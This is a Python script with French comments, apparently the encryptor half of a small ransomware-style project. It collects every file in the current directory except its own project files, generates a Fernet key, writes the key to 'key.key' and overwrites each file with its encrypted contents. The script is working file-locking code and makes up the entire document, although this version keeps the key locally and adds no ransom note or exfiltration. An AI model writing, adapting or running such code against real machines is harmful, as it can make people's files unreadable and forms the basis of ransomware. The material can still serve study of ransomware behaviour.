import os
from cryptography.fernet import Fernet

# Creation d'une variable files qui va contenir les noms de fichiers à crypter
files = []

# On parcourt le dossier courant
for file in os.listdir():
    if file == 'cryptor.py' or file == 'key.key' or file =='decryptor.py' or file == 'README.md':
        continue
    if os.path.isfile(file):
        files.append(file)

# On affiche les fichiers à crypter
print(files)

# On génère une clé
key = Fernet.generate_key()
# On écrit la clé dans un fichier
with open('key.key', 'wb') as key_file:
    key_file.write(key)

# On crypte les fichiers
for file in files:
    # On lit le fichier
    with open(file, 'rb') as f:
        data = f.read()
    # On crypte le fichier
    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)
    # On écrit le fichier crypté
    with open(file, 'wb') as f:
        f.write(encrypted)
